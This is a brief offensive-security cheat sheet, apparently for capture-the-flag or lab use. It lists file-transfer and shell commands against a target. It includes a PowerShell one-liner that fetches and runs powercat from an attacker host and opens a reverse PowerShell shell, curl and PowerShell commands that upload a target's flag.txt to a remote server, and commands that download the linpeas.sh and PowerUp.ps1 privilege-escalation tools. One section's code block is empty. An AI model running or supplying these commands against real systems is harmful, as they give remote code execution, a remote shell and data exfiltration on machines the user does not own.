# Cybersecurity Tools and Files

PowerCat

```
https://raw.githubusercontent.com/voidascent/sec/main/powercat.ps1
```

```powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.10/powercat.ps1');powercat -c 192.168.1.10 -p 9999 -e powershell
```

HTTP Server for Upload and Download

```bash

```

Curl (Linux and Windows cmd)

Curl Upload

```
curl -F 'file=@**/home/ubuntu/Desktop/flag.txt**' **http://192.168.10.10:8000/**
```

Curl Download

```
curl -O **http://192.168.10.10:8000/**download/linpeas.sh
```

PowerShell (Supported in PowerShell 3.0 and later)

PowerShell Upload

```
$FilePath = "**C:\Users\Administrator\Desktop\flag.txt**"; $Url = "**http://192.168.10.10:8000/**"; Add-Type -AssemblyName System.Net.Http; $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($FilePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, "file", [System.IO.Path]::GetFileName($FilePath)); $result = $client.PostAsync($Url, $content).Result; $result.Content.ReadAsStringAsync().Result
```

PowerShell Download

```
Invoke-WebRequest -Uri "**http://192.168.10.10:8000/download/PowerUp.ps1**" -OutFile "**C:\Users\Administrator\Desktop\PowerUp.ps1**"
```
